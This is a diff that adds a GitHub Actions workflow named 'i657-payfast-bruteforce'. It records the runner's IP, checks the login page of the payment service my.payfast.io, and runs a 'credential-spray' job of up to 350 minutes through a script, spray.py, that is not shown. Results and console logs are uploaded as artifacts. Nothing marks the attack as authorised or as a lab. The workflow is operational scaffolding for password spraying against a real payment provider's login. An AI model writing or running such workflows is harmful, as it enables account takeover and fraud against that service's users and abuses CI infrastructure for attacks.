@@ -1,0 +1,42 @@
+name: i657-payfast-bruteforce
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  spray:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: checkout
+        uses: actions/checkout@v4
+
+      - name: runner-identity
+        run: |
+          echo "runner_ip=$(curl -s --max-time 15 https://api.ipify.org)" | tee runner.txt
+          echo "started=$(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a runner.txt
+          curl -sk --max-time 20 -o /dev/null -w "payfast_login_http=%{http_code}\n" https://my.payfast.io/login | tee -a runner.txt
+
+      - name: install-deps
+        run: |
+          python3 -m pip install --quiet --disable-pip-version-check requests urllib3
+          python3 -c "import requests; print('requests', requests.__version__)"
+
+      - name: credential-spray
+        run: |
+          python3 i657/spray.py 2>&1 | tee i657/spray_console.log
+
+      - name: upload-results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i657-payfast-results
+          path: |
+            i657/out/
+            i657/spray_console.log
+            runner.txt
+          if-no-files-found: warn
+          retention-days: 30
